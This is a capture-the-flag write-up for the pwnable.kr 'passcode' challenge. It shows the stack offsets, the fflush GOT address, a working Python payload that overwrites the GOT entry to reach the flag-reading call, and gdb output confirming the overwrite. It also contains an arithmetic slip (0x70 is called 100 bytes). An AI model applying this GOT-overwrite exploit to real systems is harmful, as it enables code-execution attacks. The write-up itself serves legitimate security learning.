# passcode

1. Login into with pass `guest`:
```
ssh passcode@pwnable.kr -p2222  
```

2. Look at the source code of passcode.c

3. How i solved this:
```
printf("Welcome %s!\n", name); // welcome func
fflush(stdin);                 // login func
```
0xffbaf578 - start addres of `name` buffer (on the stack)
0xffbaf5d8 - address of `passcode1`

The difference is 0xffbaf5d8 - 0xffbaf578 = 0x70 (100 bytes)
I can easily overrite an address of `passcode1` by filling last 4 bytes of the `name` buffer.

Now I take an address of `passcode1` and passes there a `flush` function address read from GOT table:

```
$ readelf -a passcode
```
Relocation section '.rel.plt' at offset 0x398 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0  <==============

The address of `flush` function: `0x0804a004` call is passed to `passcode1` address.
``` $ python -c "import struct; print(struct.pack("<I", 0x804a004))" ```
Now for the `scanf`, I pass an address of  `system("/bin/cat flag");` into `%d` call which will overwrite `flush` function address earlier stored in `passcode1`
The address of `system("/bin/cat flag");` read from `$gdb disas main` is following: `0x080485e3` .
So the full payload will be:

```
$ python -c "print('A'*96+'\x04\xa0\x04\x08\n'+str(0x080485e3))" > /tmp/payload

$ gdb passcode
(gdb) r < /tmp/payload

$ ./passcode < /tmp/payload
```

```
BEFORE scanf("%d", passcode1):
gef➤  x/2xw 0x0804a004
0x804a004 <fflush@got.plt>:     0x08048436      0x08048446

AFTER scanf("%d", passcode1):
gef➤ x/2xw 0x0804a004
0x804a004 <fflush@got.plt>:     0x080485e3      0x08048446
```


You'll get the flag:  
```
FLAG: {Sorry mom.. I got confused about scanf usage :(}
```
